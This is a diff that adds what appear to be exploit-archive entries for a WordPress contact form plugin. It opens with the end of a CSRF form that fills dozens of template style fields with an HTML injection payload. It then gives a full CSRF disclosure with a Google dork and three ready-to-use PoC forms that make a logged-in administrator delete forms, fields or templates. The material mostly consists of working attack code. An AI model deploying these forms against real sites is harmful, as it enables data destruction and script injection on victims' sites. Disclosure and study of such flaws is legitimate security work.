+      <input type="hidden" name="styles&#91;176&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;177&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;178&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;179&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;180&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;181&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;182&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;183&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;184&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;185&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;186&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;187&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;188&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;189&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;171&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;514&#93;" value="cfg&#95;font&#95;effect&#95;none" />
+      <input type="hidden" name="styles&#91;172&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;173&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;174&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;175&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;169&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;521&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;522&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;170&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;523&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;535&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;536&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;537&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;538&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;539&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;540&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;541&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;542&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;543&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;544&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;545&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;546&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;547&#93;" value="solid" />
+      <input type="hidden" name="styles&#91;548&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;549&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;550&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;551&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;524&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;525&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;526&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;527&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;528&#93;" value="none" />
+      <input type="hidden" name="styles&#91;529&#93;" value="inherit" />
+      <input type="hidden" name="styles&#91;530&#93;" value="cfg&#95;font&#95;effect&#95;none" />
+      <input type="hidden" name="styles&#91;531&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;532&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;533&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;534&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;91&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;50&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;212&#93;" value="left" />
+      <input type="hidden" name="styles&#91;92&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;93&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;209&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;100&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;101&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;127&#93;" value="solid" />
+      <input type="hidden" name="styles&#91;102&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;103&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;104&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;105&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;94&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;95&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;96&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;97&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;98&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;99&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;106&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;107&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;108&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;109&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;110&#93;" value="none" />
+      <input type="hidden" name="styles&#91;112&#93;" value="inherit" />
+      <input type="hidden" name="styles&#91;515&#93;" value="cfg&#95;font&#95;effect&#95;none" />
+      <input type="hidden" name="styles&#91;113&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;114&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;115&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;116&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;51&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;52&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;124&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;516&#93;" value="cfg&#95;font&#95;effect&#95;none" />
+      <input type="hidden" name="styles&#91;125&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;126&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;117&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;118&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;119&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;120&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;121&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;122&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;552&#93;" value="1" />
+      <input type="hidden" name="styles&#91;553&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;554&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;555&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;556&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;596&#93;" value="none" />
+      <input type="hidden" name="styles&#91;590&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;591&#93;" value="solid" />
+      <input type="hidden" name="styles&#91;592&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;558&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;559&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;560&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;561&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;563&#93;" value="1" />
+      <input type="hidden" name="styles&#91;562&#93;" value="1" />
+      <input type="hidden" name="styles&#91;597&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;598&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;564&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;565&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;566&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;594&#93;" value="none" />
+      <input type="hidden" name="styles&#91;567&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;568&#93;" value="solid" />
+      <input type="hidden" name="styles&#91;569&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;570&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;571&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;572&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;573&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;574&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;595&#93;" value="none" />
+      <input type="hidden" name="styles&#91;575&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;576&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;577&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;578&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;579&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;580&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;581&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;582&#93;" value="normal" />
+      <input type="hidden" name="styles&#91;593&#93;" value="none" />
+      <input type="hidden" name="styles&#91;583&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;584&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;585&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;586&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;599&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="styles&#91;628&#93;" value="&quot;&gt;&lt;img&#32;src&#61;x&gt;" />
+      <input type="hidden" name="task" value="save" />
+
+      <input type="hidden" name="id" value="2" />	<!-- template id to edit -->
+
+      <input type="submit" value="Click me for update template" />
+    </form>
+  </body>
+</html>
+<!--
+  2015-09-02: vulnerability found
+  2015-09-04: Reported to vendor
+  2015-09-04: Full disclosure  
+-->
+
+<html>
+  <!--
+	# Exploit Title: WordPress Contact Form Generator v2.0.1 and below (delete) Cross-site Request Forgery (CSRF) issues
+	# Date: 2015-09-04
+	# Google Dork: Index of /wp-content/plugins/contact-form-generator/
+	# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+	# Vendor Homepage: http://creative-solutions.net/
+	# plugin uri: http://creative-solutions.net/wordpress/contact-form-generator/
+	# Software Link: https://downloads.wordpress.org/plugin/contact-form-generator.zip
+	# Version: 2.0.1
+	# Tested on: windows 10 + firefox. 
+
+	==============
+	  Description
+	==============
+	Contact Form Generator is a powerful contact form builder for WordPress! See <a href="http://creative-solutions.net/wordpress/contact-form-generator/demo">Live Demos</a>. It is packed with a <a href="http://creative-solutions.net/wordpress/contact-form-generator/template-creator-demo">Template Creator Wizard</a> to create fantastic forms in a matter of seconds without coding.
+	
+	===================
+	 TECHNICAL DETAILS
+	===================
+	A CSRF issue was found in the latest version of the plugin for wordpress 'Contact Form Generator'.
+    The issue can be exploited by sending a special link to a wordpress administrator having installed the vulnerable plugin,
+    making the victim administrator user deletes a form (PoC # 1), delete a form element (PoC # 2), or delete an existing template (PoC # 3).
+  -->
+  <!-- 
+ 	===============================
+  	 delete a form  [CSRF PoC #1]
+	===============================
+  -->
+  <body>
+    <form action="http://localhost/wordpress2/wp-admin/admin.php?page=cfg_forms" method="POST">
+      <input type="hidden" name="filter&#95;state" value="2" />
+      <input type="hidden" name="filter&#95;search" value="" />
+       <!-- form id value.. -->
+      <input type="hidden" name="ids&#91;&#93;" value="2" />      
+      <!-- end -->
+      <input type="hidden" name="task" value="delete" />
+      <input type="submit" value="Delete form(s)" />
+    </form>
+  </body>
+  <!-- 
+ 	===============================
+  	 delete a field  [CSRF PoC #2]
+	===============================
+  -->
+  <body>
+    <form action="http://localhost/wordpress2/wp-admin/admin.php?page=cfg_fields" method="POST">
+      <input type="hidden" name="filter&#95;form" value="3" />
+      <input type="hidden" name="filter&#95;state" value="2" />
+      <input type="hidden" name="filter&#95;type" value="0" />
+      <input type="hidden" name="filter&#95;search" value="" />
+
+      <!-- fields ids to delete -->	
+      <input type="hidden" name="ids&#91;&#93;" value="9" />
+      <input type="hidden" name="ids&#91;&#93;" value="10" />
+      <!-- end list -->
+	
+      <input type="hidden" name="task" value="delete" />
+      <input type="hidden" name="ids&#91;&#93;" value="" />
+      <input type="submit" value="delete field(s)" />
+    </form>
+  </body>
+  <!-- 
+ 	==================================
+  	 delete a template  [CSRF PoC #3]
+	==================================
+  -->
+  <body>
+    <form action="http://localhost/wordpress2/wp-admin/admin.php?page=cfg_templates" method="POST">
+      <input type="hidden" name="filter&#95;state" value="2" />
+      <input type="hidden" name="filter&#95;search" value="" />
+      <!-- an existing template id(s) to delete -->
+      <input type="hidden" name="ids&#91;&#93;" value="1" />    
+      <!--end-->
+      <input type="hidden" name="task" value="delete" />
+      <input type="hidden" name="ids&#91;&#93;" value="" />
+      <input type="submit" value="Delete template(s)" />
+    </form>
+  </body>
+<!---
+	===========
+	 TIME-LINE
+	===========
+	2015-09-02: vulnerability found
+	2015-09-04: Reported to vendor
+	2015-09-04: Full disclosure
+->
